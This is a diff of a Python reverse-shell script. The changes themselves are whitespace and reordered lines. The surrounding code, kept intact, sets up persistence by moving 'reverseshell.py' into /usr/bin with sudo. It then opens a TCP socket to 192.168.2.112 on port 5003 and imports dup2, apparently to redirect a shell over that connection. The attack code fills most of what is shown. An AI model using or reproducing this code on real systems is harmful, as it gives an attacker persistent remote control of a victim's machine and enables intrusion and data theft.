@@ -1,4 +1,5 @@
 #!/usr/bin/env
+
 from subprocess import run
 import os 
 
@@ -7,8 +8,8 @@ while True:
     def persistence_job():
         import platform
         import time
-        os.system('clear')
         
+        os.system('clear')
         FILE_CHECK = os.path.exists("reverseshell.py")
         if FILE_CHECK == True:   
             os.system('sudo mv reverseshell.py /usr/bin')
@@ -30,12 +31,10 @@ while True:
             self.TARGET_PORT = TARGET_PORT
             
     REVERSE_CONNECTION = shell("192.168.2.112", int(5003))
-
     from os import dup2
     import socket
-
+    
     os.system('clear')
-
     # Change socket.SOCK_STREM(TCP) to socket.SOCK_DRAM for UDP connection
     SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))
